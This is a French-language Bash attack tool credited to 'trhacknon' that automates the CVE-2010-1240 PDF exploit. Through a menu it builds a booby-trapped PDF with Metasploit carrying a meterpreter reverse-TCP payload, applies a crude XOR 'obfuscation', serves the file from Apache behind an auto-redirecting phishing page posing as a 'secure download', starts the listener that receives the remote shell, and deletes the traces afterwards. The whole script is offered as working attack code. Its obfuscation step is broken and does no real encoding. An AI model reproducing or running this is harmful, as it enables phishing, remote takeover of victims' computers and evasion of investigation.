#!/bin/bash

# Script par trhacknon
# Générateur d'exploit PDF avec phishing intégré

# Couleurs pour l'affichage
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# Vérification des permissions root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Ce script doit être exécuté en root.${RESET}"
   exit 1
fi

echo -e "${BLUE}[+] Exploit PDF CVE-2010-1240 - Générateur par trhacknon${RESET}"
echo -e "${YELLOW}[1] Générer un PDF infecté"
echo -e "[2] Obfusquer le payload"
echo -e "[3] Héberger le fichier et démarrer Apache"
echo -e "[4] Créer une page de phishing"
echo -e "[5] Lancer le listener Metasploit"
echo -e "[6] Nettoyer les traces"
echo -e "[7] Quitter${RESET}"
read -p "[*] Sélectionnez une option : " choice

case $choice in
  1)
    echo -e "${GREEN}[+] Création du PDF infecté...${RESET}"
    read -p "[*] Entrez l'IP de votre machine Kali : " LHOST
    read -p "[*] Entrez le port d'écoute : " LPORT
    read -p "[*] Nom du fichier PDF original (ex: doc.pdf) : " INFILENAME
    read -p "[*] Nom du fichier final piégé : " FILENAME

    msfconsole -q -x "use exploit/windows/fileformat/adobe_pdf_embedded_exe;
    set payload windows/meterpreter/reverse_tcp;
    set LHOST $LHOST;
    set LPORT $LPORT;
    set INFILENAME '$INFILENAME';
    set FILENAME '$FILENAME';
    exploit; exit"

    echo -e "${GREEN}[+] PDF infecté généré : $FILENAME${RESET}"
    ;;

  2)
    echo -e "${GREEN}[+] Obfuscation du payload en Base64 + XOR...${RESET}"
    read -p "[*] Nom du fichier PDF piégé : " FILENAME
    mv ~/.msf4/local/$FILENAME /var/www/html/

    # Encodage XOR simple avec clé aléatoire
    KEY=$(openssl rand -hex 4)
    cat /var/www/html/$FILENAME | xxd -p | tr -d '\n' | sed "s/../&^$KEY/g" > /var/www/html/$FILENAME.xor
    echo -e "${GREEN}[+] Payload encodé avec clé XOR : $KEY${RESET}"
    echo -e "${GREEN}[+] Fichier encodé disponible : /var/www/html/$FILENAME.xor${RESET}"
    ;;

  3)
    echo -e "${GREEN}[+] Démarrage du serveur Apache...${RESET}"
    service apache2 start
    echo -e "${GREEN}[+] Le fichier est accessible sur : http://$LHOST/$FILENAME${RESET}"
    ;;

  4)
    echo -e "${GREEN}[+] Création d'une page de phishing...${RESET}"
    read -p "[*] Nom du fichier PDF affiché sur la page (ex: document_officiel.pdf) : " PHISH_FILENAME
    echo "<html>
    <head>
      <title>Téléchargement sécurisé</title>
      <meta http-equiv='refresh' content='0; url=http://$LHOST/$FILENAME'>
      <style>
        body { background-color: #111; color: #0f0; font-family: Arial, sans-serif; text-align: center; }
        h1 { color: #f00; }
        a { color: #00f; }
      </style>
    </head>
    <body>
      <h1>🔒 Téléchargement sécurisé</h1>
      <p>Votre fichier est prêt à être téléchargé :</p>
      <a href='http://$LHOST/$FILENAME'>$PHISH_FILENAME</a>
      <p>Merci de patienter...</p>
    </body>
    </html>" > /var/www/html/index.html

    echo -e "${GREEN}[+] Page de phishing créée : http://$LHOST${RESET}"
    ;;

  5)
    echo -e "${GREEN}[+] Démarrage du listener Metasploit...${RESET}"
    msfconsole -q -x "use exploit/multi/handler;
    set payload windows/meterpreter/reverse_tcp;
    set LHOST $LHOST;
    set LPORT $LPORT;
    run"
    ;;

  6)
    echo -e "${RED}[!] Suppression des fichiers et logs...${RESET}"
    rm -f /var/www/html/$FILENAME /var/www/html/$FILENAME.xor /var/www/html/index.html
    service apache2 stop
    echo -e "${GREEN}[+] Nettoyage terminé.${RESET}"
    ;;

  7)
    echo -e "${YELLOW}[!] Fermeture du script.${RESET}"
    exit 0
    ;;

  *)
    echo -e "${RED}[!] Option invalide.${RESET}"
    ;;
esac
